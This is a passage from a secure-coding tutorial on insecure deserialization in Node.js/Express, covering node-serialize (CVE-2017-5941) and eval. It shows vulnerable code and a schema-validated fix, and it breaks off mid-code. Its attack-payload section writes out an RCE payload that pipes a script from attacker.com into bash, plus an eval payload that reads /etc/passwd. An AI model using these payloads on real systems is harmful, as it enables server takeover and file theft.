Deserialization of untrusted data is extremely dangerous and has led to numerous remote code execution vulnerabilities. The infamous node-serialize vulnerability (CVE-2017-5941) allowed attackers to execute arbitrary code by sending malicious serialized objects.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');

const app = express();
app.use(express.json());

// DANGEROUS: Deserializing untrusted user input
app.post('/api/restore-session', (req, res) => {
  const { sessionData } = req.body;

  // VULNERABLE: Directly unserializing user-controlled data
  // node-serialize can execute JavaScript functions during deserialization
  const userData = serialize.unserialize(sessionData);

  // Process restored session
  req.session = userData;
  res.json({ status: 'Session restored', user: userData.username });
});

// Another vulnerable pattern: eval-based JSON parsing
app.post('/api/process-config', (req, res) => {
  const configString = req.body.config;

  // VULNERABLE: Using eval to parse "JSON"
  const config = eval('(' + configString + ')');

  res.json({ applied: config });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized payload with IIFE for RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Payload for the eval vulnerability
(function(){require('child_process').execSync('cat /etc/passwd')})()
```

**Why This Is Dangerous**:
- node-serialize executes JavaScript functions embedded in serialized data when the `_$$ND_FUNC$$_` marker is present
- The attacker gains full code execution on the server with the application's privileges
- eval() directly executes any JavaScript code, including malicious payloads
- No sandboxing or validation prevents arbitrary system commands

**SECURE VERSION**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');

const app = express();
const ajv = new Ajv({ allErrors: true });
addFormats(ajv);

// Define strict schema for expected data
const sessionSchema = {
  type: 'object',
  properties: {
    username: { type: 'string', maxLength: 50, pattern: '^[a-zA-Z0-9_]+$' },
    userId: { type: 'integer', minimum: 1 },
    role: { type: 'string', enum: ['user', 'admin', 'moderator'] },
    lastAccess: { type: 'string', format: 'date-time' }
  },
  required: ['username', 'userId'],
  additionalProperties: false  // Reject unknown properties
};

const validateSession = ajv.compile(sessionSchema);

// SECURE: Using JSON.parse with schema validation
app.post('/api/restore-session', express.json({ limit: '10kb' }), (req, res) => {
  try {
    // Step 1: Parse as plain JSON (safe - no code execution)
    const sessionData = req.body.sessionData;

    if (typeof sessionData !== 'object' || sessionData === null) {
      return res.status(400).json({ error: 'Invalid session data format' });
    }

    // Step 2: Validate against strict schema
    if (!validateSession(sessionData)) {
      console.warn(`Invalid session data from ${req.ip}:`, validateSession.errors);
      return res.status(400).json({ error: 'Session data validation failed' });
    }

    // Step 3: Reconstruct with only allowed fields (defense in depth)
    const safeUserData = {
      username: String(sessionData.username),
      userId: Number(sessionData.userId),
      role: sessionData.role || 'user',
      lastAccess: sessionData.lastAccess || new Date().toISOString()
    };

    req.session = safeUserData;
    res.json({ status: 'Session restored', user: safeUserData.username });

  } catch (error) {
